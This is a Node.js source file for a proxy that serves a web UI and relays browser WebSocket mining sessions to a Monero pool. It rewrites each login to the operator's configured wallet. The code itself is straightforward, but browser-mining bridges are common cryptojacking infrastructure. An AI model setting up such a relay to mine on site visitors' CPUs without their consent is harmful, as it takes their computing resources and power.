// Local demo proxy: serves the static webui on HTTP, bridges browser
// WebSocket sessions to a Monero pool over raw TCP stratum.
//
// Render compatible:
// - Uses process.env.PORT
// - Listens on 0.0.0.0
// - Raw TCP listener disabled by default
//
// Browser WebSocket connections remain available.

const net  = require('net');
const http = require('http');
const fs   = require('fs');
const path = require('path');
const { WebSocketServer } = require('../vendor/ws');
const config = require('../config');

// MIME types
const MIME = {
  '.html':  'text/html',
  '.js':    'application/javascript',
  '.wasm':  'application/wasm',
  '.css':   'text/css',
  '.woff2': 'font/woff2',
};

const publicDir = path.join(__dirname, '..', 'public');

function hexToBytes(hex) {
  const out = Buffer.alloc(hex.length / 2);
  for (let i = 0; i < out.length; i++) {
    out[i] = parseInt(hex.substr(i * 2, 2), 16);
  }
  return out;
}

function targetToDiff(targetHex) {
  const raw = hexToBytes(targetHex);
  let target = 0n;

  if (raw.length === 4) {
    const t32 = BigInt(raw.readUInt32LE(0));
    if (t32 !== 0n) {
      target = 0xffffffffffffffffn / (0xffffffffn / t32);
    }
  } else if (raw.length === 8) {
    target = raw.readBigUInt64LE(0);
  } else if (raw.length >= 32) {
    target = raw.readBigUInt64LE(24);
  }

  return target ? Number(0xffffffffffffffffn / target) : 0;
}

// One client session = one upstream pool TCP socket.
function createSession(tag, sendToClient, target = {}) {
  let pool = null;
  let poolBuffer = '';
  let poolReady = false;
  let minerId = null;
  let pending = [];
  let rewriteLogin = true;
  let poolFailureNotified = false;

  const MAX_PENDING = 32;

  const sessionUid = Math.random().toString(36).slice(2, 8);

  let currentHost = target.host || config.POOL_HOST;
  let currentPort = target.port || config.POOL_PORT;

  let walletOverride = null;
  let workerOverride = null;

  function safeSendToClient(obj) {
    try {
      sendToClient(JSON.stringify(obj));
    } catch (_) {}
  }

  function sendToPool(msg) {
    const line = JSON.stringify(msg) + '\n';

    if (poolReady && pool && !pool.destroyed && pool.writable) {
      try {
        pool.write(line);
        return;
      } catch (err) {
        console.error(`[${tag}/pool] write failed: ${err.message}`);
        poolReady = false;
        try {
          pool.destroy();
        } catch (_) {}
      }
    }

    if (msg.method === 'submit') {
      safeSendToClient({
        id: msg.id,
        error: {
          message: 'Upstream pool disconnected; share was not replayed'
        }
      });
      return;
    }

    if (pending.length >= MAX_PENDING) {
      safeSendToClient({
        id: msg.id,
        error: {
          message: 'Upstream connection queue is full'
        }
      });
      return;
    }

    pending.push(line);

    if (!pool || pool.destroyed) {
      connectPool();
    }
  }

  function disconnectPool() {
    if (pool && !pool.destroyed) {
      try {
        pool.destroy();
      } catch (_) {}
    }

    pool = null;
    poolReady = false;
    poolBuffer = '';
  }

  function connectPool() {
    if (pool && !pool.destroyed) return;

    poolReady = false;
    poolFailureNotified = false;

    const myPool = new net.Socket();

    myPool.setKeepAlive(true, 15000);

    pool = myPool;
    minerId = null;
    poolBuffer = '';

    myPool.connect(currentPort, currentHost, () => {
      if (pool !== myPool) return;

      console.log(
        `[${tag}/pool] connected ${currentHost}:${currentPort}`
      );

      poolReady = true;

      const queued = pending;
      pending = [];

      for (const line of queued) {
        if (pool !== myPool || myPool.destroyed) break;

        try {
          myPool.write(line);
        } catch (err) {
          console.error(
            `[${tag}/pool] queued write failed: ${err.message}`
          );

          try {
            myPool.destroy();
          } catch (_) {}

          break;
        }
      }
    });

    myPool.on('data', (data) => {
      if (pool !== myPool) return;

      poolBuffer += data.toString();

      const lines = poolBuffer.split('\n');
      poolBuffer = lines.pop();

      for (const line of lines) {
        if (!line.trim()) continue;

        try {
          const msg = JSON.parse(line);

          if (msg.result && msg.result.id != null) {
            minerId = msg.result.id;
          }

          const job =
            (msg.result && msg.result.job) ||
            (msg.method === 'job' && msg.params);

          if (job && job.target) {
            const diff = targetToDiff(job.target);

            console.log(
              `[${tag}/pool job] id ${job.job_id} diff ${diff || '?'}`
            );
          }

          safeSendToClient(msg);
        } catch (_) {
          console.error(
            `[${tag}/pool] bad JSON: ${line.slice(0, 80)}`
          );
        }
      }
    });

    myPool.on('error', (err) => {
      if (pool !== myPool) return;

      console.error(`[${tag}/pool] error: ${err.message}`);

      poolReady = false;

      if (!poolFailureNotified) {
        poolFailureNotified = true;

        safeSendToClient({
          error: 'Pool connection error: ' + err.message
        });
      }

      try {
        myPool.destroy();
      } catch (_) {}
    });

    myPool.on('close', (hadError) => {
      if (pool !== myPool) return;

      console.log(
        `[${tag}/pool] disconnected${hadError ? ' (socket error)' : ''}`
      );

      poolReady = false;
      pool = null;
      poolBuffer = '';
      pending = [];

      if (!poolFailureNotified) {
        safeSendToClient({
          error: 'Pool disconnected'
        });
      }

      poolFailureNotified = false;
    });
  }

  function onClientMessage(rawText) {
    try {
      const msg = JSON.parse(rawText);

      // Legacy ping compatibility
      if (msg.method === 'ping') {
        safeSendToClient({
          id: msg.id,
          result: { status: 'OK' }
        });
        return;
      }

      // Browser target configuration
      if (msg.method === 'set_target') {
        const p = msg.params || {};

        const newHost = p.host
          ? String(p.host)
          : currentHost;

        const newPort = p.port
          ? Number(p.port)
          : currentPort;

        const newWallet = p.wallet
          ? String(p.wallet)
          : walletOverride;

        const newWorker =
          (typeof p.worker === 'string')
            ? p.worker
            : workerOverride;

        if (
          !newHost ||
          newHost.length > 253 ||
          /[\s/<>]/.test(newHost) ||
          !Number.isInteger(newPort) ||
          newPort < 1 ||
          newPort > 65535
        ) {
          safeSendToClient({
            id: msg.id,
            error: {
              message: 'Invalid pool host or port'
            }
          });
          return;
        }

        const changed =
          newHost !== currentHost ||
          newPort !== currentPort;

        currentHost = newHost;
        currentPort = newPort;
        walletOverride = newWallet;
        workerOverride = newWorker;

        console.log(
          `[${tag}/set_target] -> ${currentHost}:${currentPort}, wallet=${(walletOverride || config.WALLET).slice(0, 12)}…`
        );

        if (changed) {
          const wasConnected = !!pool;

          disconnectPool();
          pending = [];

          if (wasConnected) {
            connectPool();
          }
        }

        return;
      }

      // Login rewriting
      if (msg.method === 'login' && rewriteLogin) {
        msg.params = msg.params || {};

        const baseLogin =
          walletOverride || config.WALLET;

        const baseWorker =
          (workerOverride && workerOverride.trim()) ||
          config.WORKER_NAME ||
          'x';

        const uniqueWorker =
          `${baseWorker}-${sessionUid}`;

        // Demande une difficulté fixe à MoneroOcean dès la connexion.
        // La valeur est réglable dans config.js avec FIXED_DIFF.
        const fixedDiff = Number(config.FIXED_DIFF) || 0;

        msg.params.login = fixedDiff > 0
          ? `${baseLogin}+${fixedDiff}`
          : baseLogin;

        msg.params.pass = uniqueWorker;
        msg.params.rigid = uniqueWorker;
        msg.params.agent = `gh-distro-miner/1.0 (${tag})`;
        msg.params.algo = ['rx/0'];

        console.log(
          `[${tag}/login] worker=${uniqueWorker}`
        );
      }

      // Share submission
      if (msg.method === 'submit' && minerId && rewriteLogin) {
        msg.params = msg.params || {};
        msg.params.id = minerId;
      }

      sendToPool(msg);

    } catch (e) {
      console.error(
        `[${tag}] bad client message: ${e.message}`
      );
    }
  }

  function onClientClose() {
    console.log(`[${tag}] client disconnected`);

    pending = [];
    disconnectPool();
  }

  return {
    onClientMessage,
    onClientClose,

    setLoginPassthrough() {
      rewriteLogin = false;
    },
  };
}

// HTTP request handler
const requestHandler = (req, res) => {

  // Render health check
  if (
    req.url === '/health' ||
    req.url === '/healthz'
  ) {
    res.writeHead(200, {
      'Content-Type': 'text/plain',
      'Access-Control-Allow-Origin': '*'
    });

    res.end('OK');
    return;
  }

  // CORS preflight
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'Access-Control-Allow-Headers': '*',
    });

    res.end();
    return;
  }

  let url;

  try {
    url = new URL(req.url, 'http://localhost');
  } catch {
    res.writeHead(400);
    res.end('bad request');
    return;
  }

  const relative =
    url.pathname === '/'
      ? 'index.html'
      : url.pathname.replace(/^\/+/, '');

  const filePath = path.resolve(publicDir, relative);

  // Prevent directory traversal
  if (
    !filePath.startsWith(publicDir + path.sep) &&
    filePath !== publicDir
  ) {
    res.writeHead(403);
    res.end('forbidden');
    return;
  }

  if (
    !fs.existsSync(filePath) ||
    !fs.statSync(filePath).isFile()
  ) {
    const errPath = path.join(publicDir, '404.html');

    if (
      fs.existsSync(errPath) &&
      fs.statSync(errPath).isFile()
    ) {
      res.writeHead(404, {
        'Content-Type': 'text/html; charset=utf-8',
        'Cross-Origin-Opener-Policy': 'same-origin',
        'Cross-Origin-Embedder-Policy': 'require-corp',
        'Cross-Origin-Resource-Policy': 'same-origin',
        'Cache-Control': 'no-store',
      });

      res.end(fs.readFileSync(errPath));

    } else {
      res.writeHead(404);
      res.end('not found');
    }

    return;
  }

  const ext = path.extname(filePath);

  // COOP + COEP headers
  res.writeHead(200, {
    'Content-Type': MIME[ext] || 'application/octet-stream',

    'Cross-Origin-Opener-Policy': 'same-origin',
    'Cross-Origin-Embedder-Policy': 'require-corp',

    'Cross-Origin-Resource-Policy':
      ext === '.html'
        ? 'same-origin'
        : 'cross-origin',

    'Access-Control-Allow-Origin': '*',

    'Content-Security-Policy': [
      "default-src 'self'",
      "script-src 'self' https://cdn.jsdelivr.net blob: 'wasm-unsafe-eval' 'unsafe-eval' 'unsafe-inline'",
      "worker-src 'self' blob:",
      "connect-src 'self' https://cdn.jsdelivr.net ws: wss:",
      "img-src 'self' data:",
      "style-src 'self' 'unsafe-inline'",
    ].join('; '),

    'Cache-Control': 'no-store',
  });

  // HTML configuration placeholders
  if (/\.html$/i.test(filePath)) {
    let html = fs.readFileSync(filePath, 'utf8');

    html = html
      .replace(
        /DEFAULT_WALLET_PLACEHOLDER/g,
        config.WALLET || ''
      )
      .replace(
        /DEFAULT_POOL_HOST_PLACEHOLDER/g,
        config.POOL_HOST || ''
      )
      .replace(
        /DEFAULT_POOL_PORT_PLACEHOLDER/g,
        String(config.POOL_PORT || '')
      );

    res.end(html);
    return;
  }

  fs.createReadStream(filePath).pipe(res);
};

// HTTP server
const server = http.createServer(requestHandler);

// WebSocket server attached to HTTP server
const wss = new WebSocketServer({
  server,
  perMessageDeflate: false
});

wss.on('connection', (ws, req) => {
  console.log('[ws] browser connected');

  const url = new URL(req.url, 'http://localhost');

  const routed = url.searchParams.has('pool');
  const host = url.searchParams.get('pool');
  const port = Number(url.searchParams.get('port'));

  if (
    routed &&
    (
      !host ||
      host.length > 253 ||
      /[\s/<>]/.test(host) ||
      !Number.isInteger(port) ||
      port < 1 ||
      port > 65535
    )
  ) {
    ws.close(1008, 'Invalid pool target');
    return;
  }

  const session = createSession(
    'ws',
    (text) => {
      if (ws.readyState === 1) {
        ws.send(text);
      }
    },
    routed ? { host, port } : {}
  );

  if (routed) {
    session.setLoginPassthrough();
  }

  ws.alive = true;

  ws.on('pong', () => {
    ws.alive = true;
  });

  ws.on('error', () => {
    ws.terminate();
  });

  ws.on('message', (data) => {
    session.onClientMessage(data.toString());
  });

  ws.on('close', () => {
    session.onClientClose();
  });
});

// WebSocket heartbeat
const wsHeartbeat = setInterval(() => {
  for (const ws of wss.clients) {
    if (!ws.alive) {
      ws.terminate();
      continue;
    }

    ws.alive = false;
    ws.ping();
  }
}, 15000);

wss.on('close', () => {
  clearInterval(wsHeartbeat);
});

// Raw TCP Stratum server
// Disabled by default on Render.
// To enable it on a server supporting incoming TCP ports,
// set ENABLE_TCP_STRATUM=true.

const tcpServer = net.createServer((socket) => {
  console.log(
    `[tcp] stratum client ${socket.remoteAddress}:${socket.remotePort}`
  );

  const session = createSession('tcp', (text) => {
    if (!socket.destroyed) {
      socket.write(text + '\n');
    }
  });

  session.setLoginPassthrough();

  let buf = '';

  socket.on('data', (chunk) => {
    buf += chunk.toString();

    const lines = buf.split('\n');
    buf = lines.pop();

    for (const line of lines) {
      if (line.trim()) {
        session.onClientMessage(line);
      }
    }
  });

  socket.on('close', () => {
    session.onClientClose();
  });

  socket.on('error', (err) => {
    console.error('[tcp] socket error:', err.message);
  });
});

// Enable raw TCP only when explicitly requested
if (process.env.ENABLE_TCP_STRATUM === 'true') {
  tcpServer.listen(
    config.STRATUM_TCP_PORT,
    '0.0.0.0',
    () => {
      console.log(
        `[tcp] stratum bridge on port ${config.STRATUM_TCP_PORT}`
      );
    }
  );
}

// Render assigns the HTTP port dynamically.
// This same HTTP server also carries the WebSocket connections.
const PORT = process.env.PORT || config.WS_PORT;

server.listen(PORT, '0.0.0.0', () => {
  console.log(`RandomX proxy démarré sur le port ${PORT}`);
  console.log(`Pool : ${config.POOL_HOST}:${config.POOL_PORT}`);
  console.log(`Wallet : ${config.WALLET.slice(0, 12)}…`);
});